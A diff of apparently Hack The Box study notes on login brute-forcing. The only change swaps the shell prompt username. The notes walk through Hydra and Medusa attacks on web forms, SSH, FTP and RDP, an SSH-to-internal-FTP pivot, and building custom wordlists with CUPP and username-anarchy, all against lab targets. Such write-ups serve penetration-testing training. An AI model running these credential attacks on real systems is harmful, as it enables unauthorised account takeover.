@@ -129,7 +129,7 @@ for pin in range(10000):
 ```
 
 ```shell-session
-Jay_Patel_001@htb[/htb]$ python pin-solver.py
+Hackerpatel007_1@htb[/htb]$ python pin-solver.py
 
 ...
 Attempted PIN: [redacted]
@@ -190,7 +190,7 @@ for password in passwords:
 ```
 
 ```shell-session
-Jay_Patel_001@htb[/htb]$ python3 dictionary-solver.py
+Hackerpatel007_1@htb[/htb]$ python3 dictionary-solver.py
 
 ...
 Correct password found: [redacted]
@@ -216,13 +216,13 @@ Hybrid attacks combine dictionary + brute force: try wordlist entries first, the
 If the policy requires: min 8 chars, at least one uppercase, one lowercase, one number:
 
 ```shell-session
-Jay_Patel_001@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt
+Hackerpatel007_1@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt
 
-Jay_Patel_001@htb[/htb]$ grep -E '^.{8,}$' darkweb2017_top-10000.txt > darkweb2017-minlength.txt
-Jay_Patel_001@htb[/htb]$ grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
-Jay_Patel_001@htb[/htb]$ grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
-Jay_Patel_001@htb[/htb]$ grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
-Jay_Patel_001@htb[/htb]$ wc -l darkweb2017-number.txt
+Hackerpatel007_1@htb[/htb]$ grep -E '^.{8,}$' darkweb2017_top-10000.txt > darkweb2017-minlength.txt
+Hackerpatel007_1@htb[/htb]$ grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
+Hackerpatel007_1@htb[/htb]$ grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
+Hackerpatel007_1@htb[/htb]$ grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
+Hackerpatel007_1@htb[/htb]$ wc -l darkweb2017-number.txt
 
 89 darkweb2017-number.txt
 ```
@@ -242,15 +242,15 @@ Hydra is a fast, parallel network login cracker supporting a wide range of proto
 ### Installation
 
 ```shell-session
-Jay_Patel_001@htb[/htb]$ hydra -h
+Hackerpatel007_1@htb[/htb]$ hydra -h
 # or install:
-Jay_Patel_001@htb[/htb]$ sudo apt-get -y install hydra
+Hackerpatel007_1@htb[/htb]$ sudo apt-get -y install hydra
 ```
 
 ### Basic Syntax
 
 ```shell-session
-Jay_Patel_001@htb[/htb]$ hydra [login_options] [password_options] [attack_options] [service_options]
+Hackerpatel007_1@htb[/htb]$ hydra [login_options] [password_options] [attack_options] [service_options]
 ```
 
 ### Key Parameters
@@ -281,19 +281,19 @@ Jay_Patel_001@htb[/htb]$ hydra [login_options] [password_options] [attack_option
 
 ```shell-session
 # HTTP Basic Auth
-Jay_Patel_001@htb[/htb]$ hydra -L usernames.txt -P passwords.txt www.example.com http-get
+Hackerpatel007_1@htb[/htb]$ hydra -L usernames.txt -P passwords.txt www.example.com http-get
 
 # Multiple SSH servers from file
-Jay_Patel_001@htb[/htb]$ hydra -l root -p toor -M targets.txt ssh
+Hackerpatel007_1@htb[/htb]$ hydra -l root -p toor -M targets.txt ssh
 
 # FTP on non-standard port with verbose output
-Jay_Patel_001@htb[/htb]$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
+Hackerpatel007_1@htb[/htb]$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
 
 # Web login form
-Jay_Patel_001@htb[/htb]$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
+Hackerpatel007_1@htb[/htb]$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
 
 # RDP with generated password range (6-8 chars, alphanumeric)
-Jay_Patel_001@htb[/htb]$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
+Hackerpatel007_1@htb[/htb]$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
 ```
 
 ---
@@ -320,10 +320,10 @@ Target: known username `basic-auth-user`, unknown password.
 
 ```shell-session
 # Download wordlist
-Jay_Patel_001@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
+Hackerpatel007_1@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
 
 # Hydra attack
-Jay_Patel_001@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 10.129.x.x http-get / -s 81
+Hackerpatel007_1@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 10.129.x.x http-get / -s 81
 
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
@@ -367,7 +367,7 @@ username=john&password=secret123
 ### Hydra `http-post-form` Module
 
 ```shell-session
-Jay_Patel_001@htb[/htb]$ hydra [options] target http-post-form "path:params:condition_string"
+Hackerpatel007_1@htb[/htb]$ hydra [options] target http-post-form "path:params:condition_string"
 ```
 
 **Condition strings:**
@@ -405,11 +405,11 @@ From inspecting the lab target:
 
 ```shell-session
 # Download wordlists
-Jay_Patel_001@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
-Jay_Patel_001@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
+Hackerpatel007_1@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
+Hackerpatel007_1@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
 
 # Hydra attack
-Jay_Patel_001@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 10.129.x.x -s PORT http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+Hackerpatel007_1@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 10.129.x.x -s PORT http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
 
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
@@ -428,15 +428,15 @@ Medusa is a fast, massively parallel, modular login brute-forcer designed for re
 ### Installation
 
 ```shell-session
-Jay_Patel_001@htb[/htb]$ medusa -h
+Hackerpatel007_1@htb[/htb]$ medusa -h
 # or install:
-Jay_Patel_001@htb[/htb]$ sudo apt-get -y install medusa
+Hackerpatel007_1@htb[/htb]$ sudo apt-get -y install medusa
 ```
 
 ### Basic Syntax
 
 ```shell-session
-Jay_Patel_001@htb[/htb]$ medusa [target_options] [credential_options] -M module [module_options]
+Hackerpatel007_1@htb[/htb]$ medusa [target_options] [credential_options] -M module [module_options]
 ```
 
 ### Key Parameters
@@ -479,7 +479,7 @@ Two-stage attack: brute-force SSH → pivot inside box → discover FTP → brut
 Known username: `sshuser`
 
 ```shell-session
-Jay_Patel_001@htb[/htb]$ medusa -h 10.129.x.x -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
+Hackerpatel007_1@htb[/htb]$ medusa -h 10.129.x.x -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
 
 Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks
 ...
@@ -496,7 +496,7 @@ ACCOUNT FOUND: [ssh] Host: 10.129.x.x User: sshuser Password: [redacted] [SUCCES
 ### Stage 2 — Connect via SSH
 
 ```shell-session
-Jay_Patel_001@htb[/htb]$ ssh sshuser@10.129.x.x -p PORT
+Hackerpatel007_1@htb[/htb]$ ssh sshuser@10.129.x.x -p PORT
 ```
 
 ### Stage 3 — Internal Reconnaissance
@@ -504,12 +504,12 @@ Jay_Patel_001@htb[/htb]$ ssh sshuser@10.129.x.x -p PORT
 Inside the SSH session, check for additional services:
 
 ```shell-session
-Jay_Patel_001@htb[/htb]$ netstat -tulpn | grep LISTEN
+Hackerpatel007_1@htb[/htb]$ netstat -tulpn | grep LISTEN
 
 tcp6       0      0 :::22                   :::*                    LISTEN
 tcp6       0      0 :::21                   :::*                    LISTEN
 
-Jay_Patel_001@htb[/htb]$ nmap localhost
+Hackerpatel007_1@htb[/htb]$ nmap localhost
 
 PORT   STATE SERVICE
 21/tcp open  ftp
@@ -523,7 +523,7 @@ FTP server running on port 21 — internal only (not exposed externally).
 Found `/home/ftpuser` directory → username likely `ftpuser`.
 
 ```shell-session
-Jay_Patel_001@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2023-200_most_used_passwords.txt -M ftp -t 5
+Hackerpatel007_1@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2023-200_most_used_passwords.txt -M ftp -t 5
 
 Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks
 ...
@@ -535,7 +535,7 @@ Using `-h 127.0.0.1` targets the loopback explicitly (forces IPv4).
 ### Stage 5 — Retrieve Flag via FTP
 
 ```shell-session
-Jay_Patel_001@htb[/htb]$ ftp ftp://ftpuser:[redacted]@localhost
+Hackerpatel007_1@htb[/htb]$ ftp ftp://ftpuser:[redacted]@localhost
 
 Connected to localhost.
 220 (vsFTPd 3.0.5)
@@ -546,7 +546,7 @@ ftp> get flag.txt
 226 Transfer complete.
 ftp> exit
 
-Jay_Patel_001@htb[/htb]$ cat flag.txt
+Hackerpatel007_1@htb[/htb]$ cat flag.txt
 HTB{flag_redacted}
 ```
 
@@ -561,11 +561,11 @@ Generic wordlists cast a wide net. Custom wordlists tailored to a specific targe
 Automates username generation from a target's name, covering initials, common substitutions, leetspeak, and format variations.
 
 ```shell-session
-Jay_Patel_001@htb[/htb]$ sudo apt install ruby -y
-Jay_Patel_001@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
-Jay_Patel_001@htb[/htb]$ cd username-anarchy
+Hackerpatel007_1@htb[/htb]$ sudo apt install ruby -y
+Hackerpatel007_1@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
+Hackerpatel007_1@htb[/htb]$ cd username-anarchy
 
-Jay_Patel_001@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
+Hackerpatel007_1@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
 ```
 
 Generates combinations like: `janesmith`, `j.smith`, `smithjane`, `jane.s`, `js`, `j4n3`, `5m1th`, `FLast`, `First.Last`, etc.
@@ -575,8 +575,8 @@ Generates combinations like: `janesmith`, `j.smith`, `smithjane`, `jane.s`, `js`
 Generates personalised password wordlists based on OSINT about a target (social media, public records, company info).
 
 ```shell-session
-Jay_Patel_001@htb[/htb]$ sudo apt install cupp -y
-Jay_Patel_001@htb[/htb]$ cupp -i
+Hackerpatel007_1@htb[/htb]$ sudo apt install cupp -y
+Hackerpatel007_1@htb[/htb]$ cupp -i
 ```
 
 CUPP asks for:
@@ -604,7 +604,7 @@ CUPP generates mutations including: original + capitalized, reversed, birthdate 
 If policy requires: min 6 chars, 1 uppercase, 1 lowercase, 1 number, 2+ special chars (`!@#$%^&*`):
 
 ```shell-session
-Jay_Patel_001@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
+Hackerpatel007_1@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
 ```
 
 Reduces ~46,000 → ~7,900 passwords that actually match the policy.
@@ -612,7 +612,7 @@ Reduces ~46,000 → ~7,900 passwords that actually match the policy.
 ### Full Attack — Custom Lists + Hydra
 
 ```shell-session
-Jay_Patel_001@htb[/htb]$ hydra -L jane_smith_usernames.txt -P jane-filtered.txt 10.129.x.x -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
+Hackerpatel007_1@htb[/htb]$ hydra -L jane_smith_usernames.txt -P jane-filtered.txt 10.129.x.x -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
 
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 655060 login tries (l:14/p:46790)
